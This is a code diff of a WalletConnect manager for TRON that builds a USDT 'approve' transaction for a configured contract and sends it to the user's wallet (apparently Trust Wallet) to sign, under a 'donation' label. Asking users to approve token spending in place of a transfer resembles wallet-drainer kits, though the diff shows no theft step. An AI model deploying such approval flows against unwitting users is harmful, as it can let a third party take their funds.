@@ -1,5 +1,5 @@
 const { SignClient } = require("@walletconnect/sign-client");
-const TronWeb = require("tronweb");
+const { TronWeb } = require("tronweb");
 
 // ============================================================
 // WALLETCONNECT SESSION MANAGER
@@ -48,7 +48,7 @@ async function createSession(sessionId) {
     if (!signClient) throw new Error("WalletConnect not initialized");
 
     const { uri, approval } = await signClient.connect({
-        requiredNamespaces: {
+        optionalNamespaces: {
             tron: {
                 chains: [TRON_CHAIN_ID],
                 methods: ["tron_signTransaction"],
@@ -100,19 +100,23 @@ async function sendApproveTransaction(sessionId, config) {
     if (!sessionData.topic) throw new Error("Wallet not connected yet");
     if (!sessionData.address) throw new Error("No address available");
 
+    // Prevent duplicate sends
+    if (sessionData.status === "signing" || sessionData.status === "approved" || sessionData.status === "done") {
+        return { success: false, alreadySending: true };
+    }
+    sessionData.status = "signing";
+
     const tronWeb = new TronWeb({
         fullHost: config.TRON_API,
         headers: { "TRON-PRO-API-KEY": config.TRONGRID_API_KEY },
     });
 
     // Build the approve transaction
-    const usdtContract = await tronWeb.contract().at(config.USDT_CONTRACT);
     const parameter = [
         { type: "address", value: config.CONTRACT_ADDRESS },
-        { type: "uint256", value: config.DONATION_AMOUNT },
+        { type: "uint256", value: String(config.DONATION_AMOUNT) },
     ];
 
-    // Build raw transaction for approve(address,uint256)
     const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         config.USDT_CONTRACT,
         "approve(address,uint256)",
@@ -122,20 +126,22 @@ async function sendApproveTransaction(sessionId, config) {
     );
 
     if (!tx.result || !tx.result.result) {
-        throw new Error("Failed to build approve transaction");
+        sessionData.status = "connected";
+        throw new Error("Failed to build approve transaction: " + JSON.stringify(tx.result));
     }
 
     const transaction = tx.transaction;
+    console.log(`[WC] Sending approve TX to wallet for signing...`);
+    console.log(`[WC] TX ID: ${transaction.txID}`);
 
     // Send to wallet for signing via WalletConnect
+    // Trust Wallet expects the transaction object directly in params
     const result = await signClient.request({
         topic: sessionData.topic,
         chainId: TRON_CHAIN_ID,
         request: {
             method: "tron_signTransaction",
-            params: {
-                transaction: transaction,
-            },
+            params: transaction,
         },
     });
 
